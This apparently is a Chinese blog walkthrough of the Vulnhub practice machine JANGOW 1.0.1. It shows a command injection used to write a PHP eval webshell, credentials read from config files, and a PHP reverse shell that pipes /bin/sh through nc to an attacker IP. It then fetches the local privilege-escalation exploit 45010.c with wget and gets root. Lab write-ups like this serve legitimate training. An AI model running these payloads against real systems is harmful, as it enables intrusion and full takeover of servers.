---
title: "Vulnhub靶场-JANGOW-1-0-1"
date: 2022-09-25 21:21:45
---
发现靶机开启21端口和80端口，21端口可以考虑爆破，80端口访问+目录爆破  
 先访问网站看看

![](https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20220925112150.png)

发现这些地方可以点击

![image-20220925112851118](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20220925112851118.png)

发现注入点直接判断用户

![image-20220925112958657](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20220925112958657.png)

直接上传webshell

```plaintext
echo '<?php eval($_POST["hack"]);' > shell.php
```

蚁剑连接，在该目录下发现config.php文件，可以获取desafio02数据库的账号密码，经测试没啥用。

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220304224016961-2114294978.png)

在下图目录中发现.backup文件，可以获取jangow01数据库的账号密码

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220304224233888-1699401301.png)

因为网站使用的是php语言，所以写入一个php反弹shell文件（测试该靶机仅有443端口反弹shell）：

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.23.156.244 443 >/tmp/f');?>     #直接在本地写好，用蚁剑上传即可，我保存为test.php
```

kali监听443端口

```plaintext
nc -lvp 443 
```

此时访问test.php文件 <http://192.168.147.184/site/test.php> 即可反弹shell

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220304225714224-1370394577.png)

写入交互式shell

```rust
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

whami 发现当前权限是www-data，尝试提权。  
 uname -a 查看系统版本、lsb_release -a查看系统发行版本为Ubuntu 16.04

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220304230522300-1356476743.png)

攻击机为kali，靶机环境是ubuntu16.04，使用 searchsploit 看看有没有什么可利用的漏洞。

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305094808719-1432298619.png)

尝试利用45010.c 文件，首先find查看文件路径，找到45010.c文件路径，cp命令将其复制到 /var/www/html目录下，cd进入该目录，开启http服务。

```plaintext
python3 -m http.server 8000
```

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305095830760-95787890.png)

开启服务后去靶机执行下列命令。（如果下载不下来，我是利用蚁剑上传的45010.c文件）

```plaintext
wget http://192.168.147.178:8000/45010.c  #在靶机下载45010.c文件，传输文件
```

进入靶机查看文件45010.c存在

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305100322608-830163602.png)

gcc 45010.c 编译文件，生成a.out文件

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305100437674-166945897.png)

运行a.out文件，发现获取到root权限。

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305100605200-476281740.png)

进入 /root目录，拿到flag。

![image](https://img2022.cnblogs.com/blog/2753495/202203/2753495-20220305100731298-1973780317.png)
